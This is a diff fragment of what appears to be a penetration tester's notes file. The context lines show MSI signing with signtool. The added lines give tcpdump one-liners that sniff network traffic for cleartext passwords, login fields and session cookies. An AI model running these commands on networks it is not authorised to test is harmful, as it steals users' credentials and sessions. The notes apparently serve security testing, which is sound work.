@@ -178,3 +178,10 @@ Successfully signed: C:\EtherealMSI\myMsi.msi
 C:\Program Files (x86)\Microsoft SDKs\Windows\v7.1A\Bin>signtool.exe verify /pa C:\EtherealMSI\myMsi.msi
 SignTool Error: WinVerifyTrust returned error: 0x800B010A
         A certificate chain could not be built to a trusted root authority.
+==================================================================
+Using TCPDUMP to capture Credentials:
+tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet -lA | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd= |password=|pass:|user:|username:|password:|login:|pass |user ' 
+
+Using TCPDUMP to capture cookies:
+tcpdump -vvAls0 | grep 'Set-Cookie|Host:|Cookie:'
+==================================================================
